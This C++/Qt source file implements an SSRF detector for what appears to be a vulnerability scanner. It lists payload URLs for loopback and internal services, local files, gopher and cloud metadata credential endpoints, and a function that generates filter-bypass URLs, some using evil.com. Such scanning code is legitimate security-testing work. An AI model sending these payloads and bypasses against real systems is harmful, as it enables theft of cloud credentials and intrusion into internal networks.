#include "ssrfdetector.h"
#include <QRegularExpression>
#include <QHostAddress>

namespace {

const QStringList ssrfPayloads = {
    QStringLiteral("http://127.0.0.1/"),
    QStringLiteral("http://localhost/"),
    QStringLiteral("http://0.0.0.0/"),
    QStringLiteral("http://[::1]/"),
    QStringLiteral("http://127.1/"),
    QStringLiteral("http://127.0.1/"),
    QStringLiteral("http://0/"),
    QStringLiteral("http://0x7f000001/"),
    QStringLiteral("http://2130706433/"),
    QStringLiteral("http://017700000001/"),
    QStringLiteral("http://127.0.0.1:22/"),
    QStringLiteral("http://127.0.0.1:80/"),
    QStringLiteral("http://127.0.0.1:443/"),
    QStringLiteral("http://127.0.0.1:8080/"),
    QStringLiteral("http://127.0.0.1:8443/"),
    QStringLiteral("http://127.0.0.1:3306/"),
    QStringLiteral("http://127.0.0.1:5432/"),
    QStringLiteral("http://127.0.0.1:6379/"),
    QStringLiteral("http://127.0.0.1:27017/"),
    QStringLiteral("http://127.0.0.1:11211/"),
    QStringLiteral("http://192.168.0.1/"),
    QStringLiteral("http://192.168.1.1/"),
    QStringLiteral("http://10.0.0.1/"),
    QStringLiteral("http://172.16.0.1/"),
    QStringLiteral("http://internal/"),
    QStringLiteral("http://intranet/"),
    QStringLiteral("http://corp/"),
    QStringLiteral("http://localhost.localdomain/"),
    QStringLiteral("file:///etc/passwd"),
    QStringLiteral("file:///c:/windows/win.ini"),
    QStringLiteral("dict://127.0.0.1:11211/"),
    QStringLiteral("gopher://127.0.0.1:25/"),
    QStringLiteral("ldap://127.0.0.1/"),
    QStringLiteral("sftp://127.0.0.1/"),
    QStringLiteral("tftp://127.0.0.1/")
};

const QStringList cloudMetadataEndpoints = {
    QStringLiteral("http://169.254.169.254/latest/meta-data/"),
    QStringLiteral("http://169.254.169.254/latest/user-data/"),
    QStringLiteral("http://169.254.169.254/latest/api/token"),
    QStringLiteral("http://169.254.169.254/computeMetadata/v1/"),
    QStringLiteral("http://metadata.google.internal/computeMetadata/v1/"),
    QStringLiteral("http://metadata/computeMetadata/v1/"),
    QStringLiteral("http://169.254.169.254/metadata/instance"),
    QStringLiteral("http://169.254.169.254/metadata/v1/"),
    QStringLiteral("http://100.100.100.200/latest/meta-data/"),
    QStringLiteral("http://169.254.169.254/opc/v1/instance/"),
    QStringLiteral("http://169.254.169.254/openstack/latest/meta_data.json"),
    QStringLiteral("http://169.254.169.254/2019-10-01/meta-data/iam/security-credentials/"),
    QStringLiteral("http://169.254.170.2/v1/credentials"),
    QStringLiteral("http://192.0.0.192/latest/"),
    QStringLiteral("http://fd00:ec2::254/latest/meta-data/")
};

const QStringList internalIpRanges = {
    QStringLiteral("10.0.0.0/8"),
    QStringLiteral("172.16.0.0/12"),
    QStringLiteral("192.168.0.0/16"),
    QStringLiteral("127.0.0.0/8"),
    QStringLiteral("169.254.0.0/16"),
    QStringLiteral("100.64.0.0/10"),
    QStringLiteral("0.0.0.0/8"),
    QStringLiteral("192.0.0.0/24"),
    QStringLiteral("192.0.2.0/24"),
    QStringLiteral("198.51.100.0/24"),
    QStringLiteral("203.0.113.0/24"),
    QStringLiteral("224.0.0.0/4"),
    QStringLiteral("240.0.0.0/4")
};

const QStringList metadataIndicators = {
    QStringLiteral("ami-id"),
    QStringLiteral("instance-id"),
    QStringLiteral("instance-type"),
    QStringLiteral("local-hostname"),
    QStringLiteral("local-ipv4"),
    QStringLiteral("public-hostname"),
    QStringLiteral("public-ipv4"),
    QStringLiteral("security-groups"),
    QStringLiteral("iam/info"),
    QStringLiteral("iam/security-credentials"),
    QStringLiteral("AccessKeyId"),
    QStringLiteral("SecretAccessKey"),
    QStringLiteral("Token"),
    QStringLiteral("computeMetadata"),
    QStringLiteral("service-accounts"),
    QStringLiteral("access_token"),
    QStringLiteral("attributes"),
    QStringLiteral("project-id"),
    QStringLiteral("numeric-project-id")
};

const QStringList internalServiceIndicators = {
    QStringLiteral("It works!"),
    QStringLiteral("Apache/"),
    QStringLiteral("nginx/"),
    QStringLiteral("Welcome to nginx"),
    QStringLiteral("IIS Windows Server"),
    QStringLiteral("phpMyAdmin"),
    QStringLiteral("Jenkins"),
    QStringLiteral("Kubernetes Dashboard"),
    QStringLiteral("Grafana"),
    QStringLiteral("Prometheus"),
    QStringLiteral("Redis"),
    QStringLiteral("MongoDB"),
    QStringLiteral("PostgreSQL"),
    QStringLiteral("MySQL"),
    QStringLiteral("Elasticsearch"),
    QStringLiteral("RabbitMQ"),
    QStringLiteral("Consul"),
    QStringLiteral("etcd"),
    QStringLiteral("Docker"),
    QStringLiteral("kubelet")
};

bool containsIndicator(const QString &text, const QStringList &indicators) {
    for (const QString &indicator : indicators) {
        if (text.contains(indicator, Qt::CaseInsensitive)) {
            return true;
        }
    }
    return false;
}

} // anonymous namespace


SsrfDetector::SsrfType SsrfDetector::detect(const QString &responseBody,
                                             const QString &expectedContent) const
{
    if (responseBody.isEmpty()) {
        return SsrfType::None;
    }

    if (!expectedContent.isEmpty() && responseBody.contains(expectedContent)) {
        return SsrfType::BasicSsrf;
    }

    if (containsIndicator(responseBody, metadataIndicators)) {
        return SsrfType::BasicSsrf;
    }

    if (containsIndicator(responseBody, internalServiceIndicators)) {
        return SsrfType::BasicSsrf;
    }

    return SsrfType::None;
}

bool SsrfDetector::isVulnerable(const QString &responseBody) const
{
    return detect(responseBody, QString()) != SsrfType::None;
}

bool SsrfDetector::isInternalIp(const QString &ip) const
{
    QHostAddress addr(ip);
    if (addr.isNull()) {
        return false;
    }

    if (addr.isLoopback()) {
        return true;
    }

    if (addr.protocol() == QAbstractSocket::IPv4Protocol) {
        quint32 ipv4 = addr.toIPv4Address();

        if ((ipv4 & 0xFF000000) == 0x0A000000) return true;
        if ((ipv4 & 0xFFF00000) == 0xAC100000) return true;
        if ((ipv4 & 0xFFFF0000) == 0xC0A80000) return true;
        if ((ipv4 & 0xFFFF0000) == 0xA9FE0000) return true;
        if ((ipv4 & 0xFF000000) == 0x7F000000) return true;
        if ((ipv4 & 0xFF000000) == 0x00000000) return true;
    }

    return false;
}

bool SsrfDetector::isInternalHostname(const QString &hostname) const
{
    QString lower = hostname.toLower();

    if (lower == QStringLiteral("localhost") ||
        lower == QStringLiteral("localhost.localdomain") ||
        lower == QStringLiteral("ip6-localhost") ||
        lower == QStringLiteral("ip6-loopback")) {
        return true;
    }

    if (lower == QStringLiteral("internal") ||
        lower == QStringLiteral("intranet") ||
        lower == QStringLiteral("corp") ||
        lower == QStringLiteral("local") ||
        lower == QStringLiteral("private")) {
        return true;
    }

    if (lower.endsWith(QStringLiteral(".internal")) ||
        lower.endsWith(QStringLiteral(".local")) ||
        lower.endsWith(QStringLiteral(".corp")) ||
        lower.endsWith(QStringLiteral(".lan")) ||
        lower.endsWith(QStringLiteral(".home")) ||
        lower.endsWith(QStringLiteral(".localdomain"))) {
        return true;
    }

    if (lower == QStringLiteral("metadata.google.internal") ||
        lower == QStringLiteral("metadata")) {
        return true;
    }

    return false;
}

QStringList SsrfDetector::getPayloads()
{
    return ssrfPayloads;
}

QStringList SsrfDetector::getCloudMetadataEndpoints()
{
    return cloudMetadataEndpoints;
}

QStringList SsrfDetector::getInternalIpRanges()
{
    return internalIpRanges;
}

QStringList SsrfDetector::getBypassTechniques(const QString &blockedUrl)
{
    QStringList bypasses;
    QUrl url(blockedUrl);
    QString host = url.host();

    QString s1 = blockedUrl; s1.replace(QStringLiteral("127.0.0.1"), QStringLiteral("127.1")); bypasses << s1;
    QString s2 = blockedUrl; s2.replace(QStringLiteral("127.0.0.1"), QStringLiteral("127.0.1")); bypasses << s2;
    QString s3 = blockedUrl; s3.replace(QStringLiteral("127.0.0.1"), QStringLiteral("0x7f000001")); bypasses << s3;
    QString s4 = blockedUrl; s4.replace(QStringLiteral("127.0.0.1"), QStringLiteral("2130706433")); bypasses << s4;
    QString s5 = blockedUrl; s5.replace(QStringLiteral("127.0.0.1"), QStringLiteral("017700000001")); bypasses << s5;
    QString s6 = blockedUrl; s6.replace(QStringLiteral("127.0.0.1"), QStringLiteral("0")); bypasses << s6;
    QString s7 = blockedUrl; s7.replace(QStringLiteral("localhost"), QStringLiteral("localtest.me")); bypasses << s7;
    QString s8 = blockedUrl; s8.replace(QStringLiteral("localhost"), QStringLiteral("spoofed.burpcollaborator.net")); bypasses << s8;

    bypasses << QStringLiteral("http://%1@%2/").arg(host, QStringLiteral("evil.com"));
    bypasses << QStringLiteral("http://evil.com#@%1/").arg(host);
    bypasses << QStringLiteral("http://evil.com/%2f%2f%1/").arg(host);

    QString encodedHost = QString::fromLatin1(QUrl::toPercentEncoding(host));
    bypasses << QStringLiteral("http://%1/").arg(encodedHost);

    QString doubleEncoded = QString::fromLatin1(QUrl::toPercentEncoding(encodedHost));
    bypasses << QStringLiteral("http://%1/").arg(doubleEncoded);

    return bypasses;
}

int SsrfDetector::severityLevel(SsrfType type)
{
    switch (type) {
    case SsrfType::BasicSsrf:
        return 4; // Critical - can access internal services
    case SsrfType::BlindSsrf:
        return 3; // High
    case SsrfType::ProtocolSmuggling:
        return 3; // High
    case SsrfType::PartialSsrf:
        return 2; // Medium
    default:
        return 0;
    }
}
